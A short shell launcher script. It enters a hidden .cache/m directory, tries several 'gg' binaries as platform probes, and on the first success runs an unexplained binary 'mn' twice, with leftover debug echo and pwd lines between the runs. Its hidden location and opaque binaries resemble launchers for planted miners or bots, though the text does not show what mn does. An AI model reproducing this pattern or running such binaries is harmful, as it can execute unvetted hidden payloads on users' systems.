cd .cache/m || exit
for gg in gg*; do
  chmod +x "$gg"
  # shellcheck disable=SC2086
  if "./$gg" 2>/dev/null; then
    chmod +x mn
    echo "$gg" >system
    ./mn "$@"
    echo 1
    pwd
    cd ..
    echo 1
    pwd
    cd ..
    echo 1
    pwd
    ./.cache/m/mn "$@"
    exit
  fi
done

echo "Your system is not supported"
exit 1
